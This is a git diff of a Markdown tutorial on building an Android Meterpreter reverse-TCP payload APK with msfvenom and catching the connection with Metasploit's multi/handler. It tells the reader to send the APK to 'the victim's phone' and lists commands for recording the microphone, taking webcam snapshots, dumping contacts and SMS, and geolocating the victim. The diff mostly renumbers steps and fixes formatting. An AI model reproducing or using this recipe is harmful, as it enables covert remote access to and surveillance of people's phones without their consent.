@@ -1,9 +1,12 @@
 
 # STEPS :
 
-1. Fire Up kali and open command terminal.
+Start apache2
+```
+~ # apache2ctl start
+```
 
-2. Set payload and create custom windows executable.
+. Set payload and create custom windows executable.
 Command:
 ```
     root@kali:-# msfvenom -p android/meterpreter/reverse_tcp  LHOST=192.168.0.110 LPORT=4444 R > andro.apk 
@@ -14,16 +17,16 @@ Your apk file is being saved in the Home folder.
 
 Note: Don't add any stray space characters anywhere. Use the command as is (after changing the LHOST and LPORT as needed).
 
-3. Transfer/mail this file (here andro.apk) file to the victim's phone and install it.
+. Transfer/mail this file (here andro.apk) file to the victim's phone and install it.
 
-4. Start the metasploit framework console as follows :
+. Start the metasploit framework console as follows :
          
 Command:
 ```
     root@kali:-# msfconsole
 ```
 
-5. Now it's time to open and setup multi-handler. Follows the steps :
+. Now it's time to open and setup multi-handler. Follows the steps :
 ```
     msf  > use multi/handler
     msf exploit(handler) > set payload android/meterpreter/reverse_tcp
@@ -33,12 +36,12 @@ Command:
 ```
 
         Payload Handler is being started........
-```
-6. When the victims clicks on the app(installed as MAIN ACTIVITY in the menu) in his phone, meterpreter session will be established.
-```
+
+. When the victims clicks on the app(installed as MAIN ACTIVITY in the menu) in his phone, meterpreter session will be established.
+
 Exploits:
-```
-7. Try the following exploit commands :
+
+. Try the following exploit commands :
 ```
     - record_mic
     - webcam_snap
@@ -46,6 +49,7 @@ Exploits:
     - dump_contacts
     - dump_sms
     - geolocate
+ ```
 ************************************************************************
 Error fixing(incase you get PARSE ERROR)
 
